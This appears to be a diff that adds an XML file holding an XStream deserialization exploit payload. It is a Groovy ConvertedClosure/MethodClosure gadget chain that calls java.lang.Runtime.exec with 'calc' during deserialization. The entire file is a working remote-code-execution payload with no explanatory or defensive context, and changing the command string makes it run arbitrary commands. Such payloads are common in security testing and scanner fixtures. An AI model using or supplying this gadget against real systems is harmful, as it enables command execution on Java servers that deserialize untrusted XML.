@@ -1,0 +1,14 @@
+<tree-set>
+    <string>calc</string>
+    <dynamic-proxy>
+        <interface>java.lang.Comparable</interface>
+        <handler class="org.codehaus.groovy.runtime.ConvertedClosure">
+            <methodName>compareTo</methodName>
+            <delegate class="org.codehaus.groovy.runtime.MethodClosure">
+                <owner class="java.lang.Runtime">
+                </owner>
+                <method>exec</method>
+            </delegate>
+        </handler>
+    </dynamic-proxy>
+</tree-set>
